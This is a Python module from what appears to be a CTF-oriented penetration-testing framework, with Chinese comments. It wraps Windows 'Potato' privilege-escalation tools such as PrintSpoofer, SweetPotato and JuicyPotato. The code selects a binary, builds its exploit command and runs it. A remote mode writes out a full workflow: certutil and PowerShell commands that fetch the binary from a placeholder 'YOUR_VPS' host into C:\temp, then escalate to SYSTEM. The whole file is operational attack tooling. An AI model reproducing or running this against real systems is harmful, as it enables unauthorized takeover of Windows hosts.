# tools/potato_tool.py
"""
Potato Tools - Windows本地提权工具集

功能:
- PrintSpoofer: Win10/2016+ SeImpersonate提权
- SweetPotato: COM/DCOM滥用提权
- JuicyPotato: 老版本Windows提权
- RoguePotato: 需要出网的提权

CTF场景优化:
- 自动选择合适版本
- 生成执行命令
"""
import os
import base64
import shutil
import subprocess
from typing import Dict, Any, Optional, List
from tool_framework import CommandLineTool


class PotatoTool(CommandLineTool):
    """
    土豆提权工具集

    基于你的实战经验，主要用到：
    - PrintSpoofer (春秋云境-Tsclient)
    - SweetPotato (Brute4Road)
    """

    POTATO_TYPES = {
        "printspoofer": {
            "binary": "PrintSpoofer64.exe",
            "description": "PrintSpoofer - Win10/2016+ SeImpersonate提权",
            "usage": "PrintSpoofer64.exe -i -c cmd",
            "requirements": ["SeImpersonatePrivilege"],
            "works_offline": True
        },
        "sweetpotato": {
            "binary": "SweetPotato.exe",
            "description": "SweetPotato - COM/DCOM滥用，更通用",
            "usage": "SweetPotato.exe -p C:\\Windows\\System32\\cmd.exe",
            "requirements": ["SeImpersonatePrivilege"],
            "works_offline": True
        },
        "juicypotato": {
            "binary": "JuicyPotato.exe",
            "description": "JuicyPotato - Win2012及更早版本",
            "usage": "JuicyPotato.exe -t * -p cmd.exe",
            "requirements": ["SeImpersonatePrivilege", "DCOM"],
            "works_offline": True
        },
        "roguepotato": {
            "binary": "RoguePotato.exe",
            "description": "RoguePotato - 需要出网",
            "usage": "RoguePotato.exe -l 9999 -p cmd.exe",
            "requirements": ["SeImpersonatePrivilege", "Outbound Network"],
            "works_offline": False
        },
        "badpotato": {
            "binary": "BadPotato.exe",
            "description": "BadPotato - 另一种实现",
            "usage": "BadPotato.exe cmd.exe",
            "requirements": ["SeImpersonatePrivilege"],
            "works_offline": True
        }
    }

    def __init__(self):
        self.tools_dir = os.path.join("data", "tools", "potato")
        self.cmd_path = "cmd.exe"
        super().__init__(self.cmd_path)
        self.timeout = 60

    def name(self) -> str:
        return "potato"

    def description(self) -> str:
        return "Windows土豆提权工具集(PrintSpoofer/SweetPotato/JuicyPotato)"

    def supported_vulns(self) -> list:
        return [
            "Privilege Escalation",
            "Windows Privesc",
            "SeImpersonate Privilege",
            "Token Manipulation"
        ]

    def check_available(self) -> bool:
        """检查是否有土豆工具"""
        return os.path.exists(self.tools_dir)

    def expected_params(self) -> Dict[str, Dict[str, Any]]:
        return {
            "action": {
                "type": "str",
                "description": "操作: check/exploit/list",
                "required": True
            },
            "potato_type": {
                "type": "str",
                "description": f"土豆类型: {', '.join(self.POTATO_TYPES.keys())}",
                "required": False
            },
            "command": {
                "type": "str",
                "description": "要执行的命令，默认cmd",
                "required": False,
                "default": "cmd"
            },
            "shell_session": {
                "type": "str",
                "description": "远程shell会话标识",
                "required": False
            }
        }

    def execute(self, target: str, params: Dict) -> Dict:
        """执行土豆操作"""
        action = params.get("action", "check")
        potato_type = params.get("potato_type", "printspoofer")
        command = params.get("command", "cmd")
        shell_session = params.get("shell_session")

        if action == "check":
            return self._check_available_potatoes()
        elif action == "list":
            return self._list_potatoes()
        elif action == "exploit":
            return self._exploit(potato_type, command, shell_session)
        else:
            return {"error": f"未知操作: {action}", "success": False}

    def _check_available_potatoes(self) -> Dict:
        """检查可用的土豆工具"""
        available = []
        for ptype, info in self.POTATO_TYPES.items():
            binary = info["binary"]
            binary_path = os.path.join(self.tools_dir, binary)
            if os.path.exists(binary_path):
                available.append({
                    "type": ptype,
                    "binary": binary,
                    "description": info["description"],
                    "usage": info["usage"]
                })

        return {
            "success": True,
            "available": available,
            "tools_dir": self.tools_dir,
            "hint": "如果列表为空，请下载土豆工具放到 data/tools/potato/ 目录"
        }

    def _list_potatoes(self) -> Dict:
        """列出所有土豆类型"""
        return {
            "success": True,
            "potato_types": [
                {
                    "type": ptype,
                    "binary": info["binary"],
                    "description": info["description"],
                    "usage": info["usage"],
                    "requirements": info["requirements"],
                    "works_offline": info["works_offline"]
                }
                for ptype, info in self.POTATO_TYPES.items()
            ],
            "recommendation": {
                "Win10/2016+": "PrintSpoofer 或 SweetPotato",
                "Win2012及更早": "JuicyPotato",
                "有出网": "任意都可以，推荐PrintSpoofer",
                "无出网": "避免RoguePotato"
            }
        }

    def _exploit(self, potato_type: str, command: str, shell_session: str = None) -> Dict:
        """执行提权"""
        if potato_type not in self.POTATO_TYPES:
            return {"error": f"未知的土豆类型: {potato_type}", "success": False}

        info = self.POTATO_TYPES[potato_type]
        binary = info["binary"]
        binary_path = os.path.join(self.tools_dir, binary)

        if not os.path.exists(binary_path):
            return {
                "error": f"土豆工具不存在: {binary}",
                "success": False,
                "hint": f"下载 {binary} 放到 {self.tools_dir}/"
            }

        # 构建执行命令
        if potato_type == "printspoofer":
            exec_cmd = f"{binary} -i -c {command}"
        elif potato_type == "sweetpotato":
            exec_cmd = f"{binary} -p {command}"
        elif potato_type == "juicypotato":
            exec_cmd = f"{binary} -t * -p {command}"
        elif potato_type == "roguepotato":
            exec_cmd = f"{binary} -l 9999 -p {command}"
        else:
            exec_cmd = f"{binary} {command}"

        # 如果是远程执行，生成命令
        if shell_session:
            return self._generate_remote_commands(binary, exec_cmd, info)

        # 本地执行
        try:
            result = self._run_command(
                [binary_path] + exec_cmd.split()[1:],
                timeout=self.timeout
            )
            return {
                "success": result.get("success", False),
                "potato_type": potato_type,
                "output": result.get("stdout", ""),
                "error": result.get("stderr", "")
            }
        except Exception as e:
            return {"error": str(e), "success": False}

    def _generate_remote_commands(self, binary: str, exec_cmd: str, info: Dict) -> Dict:
        """生成远程执行命令"""
        binary_path = os.path.join(self.tools_dir, binary)

        upload_commands = {
            "certutil": f"certutil -urlcache -split -f http://YOUR_VPS/{binary} C:\\temp\\{binary}",
            "powershell": f"IEX(New-Object Net.WebClient).DownloadFile('http://YOUR_VPS/{binary}', 'C:\\temp\\{binary}')"
        }

        # 完整利用流程
        full_workflow = f"""
# 1. 上传工具
{upload_commands['certutil']}

# 2. 检查权限 (需要SeImpersonatePrivilege)
whoami /priv

# 3. 执行提权
C:\\temp\\{exec_cmd}

# 4. 验证权限
whoami
"""

        return {
            "success": True,
            "mode": "remote",
            "shell_session": True,
            "potato_info": {
                "type": info["description"],
                "requirements": info["requirements"]
            },
            "upload_commands": upload_commands,
            "exec_command": f"C:\\temp\\{exec_cmd}",
            "full_workflow": full_workflow,
            "notes": [
                f"工具: {binary}",
                f"要求: {', '.join(info['requirements'])}",
                "先确认有SeImpersonatePrivilege权限: whoami /priv"
            ]
        }


def register():
    """注册土豆工具"""
    from tool_framework import ToolRegistry
    ToolRegistry.register(PotatoTool())